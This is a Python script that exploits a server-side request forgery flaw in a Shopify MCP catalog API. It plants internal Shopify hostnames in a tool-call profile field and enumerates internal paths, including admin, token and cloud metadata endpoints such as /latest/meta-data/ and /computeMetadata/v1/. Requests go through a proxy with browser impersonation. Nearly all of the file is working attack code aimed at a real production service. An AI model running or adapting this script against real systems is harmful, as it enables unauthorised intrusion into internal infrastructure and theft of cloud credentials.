# -*- coding: utf-8 -*-
"""SSRF 深化:web.sfe 与 metadata.sfe 路径枚举(找返回 JSON 的 2xx 端点)"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        txt = r.text[:170]
        print(f"[{label}] {dt:.1f}s | {txt}", flush=True)
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s", flush=True)

if __name__ == "__main__":
    host = "web.sfe.shopifyinternal.com"
    paths = [
        "/", "/healthz", "/api", "/api/", "/api/v1", "/api/v2",
        "/health", "/status", "/version", "/info", "/metrics",
        "/login", "/admin", "/graphql", "/api/health", "/api/status",
        "/debug", "/internal", "/api/config", "/config", "/settings",
        "/api/version", "/v1", "/v2", "/swagger", "/openapi.json",
        "/api/info", "/health.json", "/api/healthz",
        "/api/user", "/api/me", "/api/currentuser",
        "/.well-known/openid-configuration", "/api/token",
    ]
    for p in paths:
        probe(f"web{p}", "https://" + host + p)
        time.sleep(0.25)

    print("== metadata.sfe ==", flush=True)
    host2 = "metadata.sfe.shopifyinternal.com"
    for p in ["/", "/healthz", "/health", "/api", "/api/v1", "/latest", "/latest/meta-data/", "/computeMetadata/v1/", "/v1", "/status", "/metrics", "/metadata", "/env", "/config", "/debug"]:
        probe(f"meta{p}", "https://" + host2 + p)
        time.sleep(0.25)
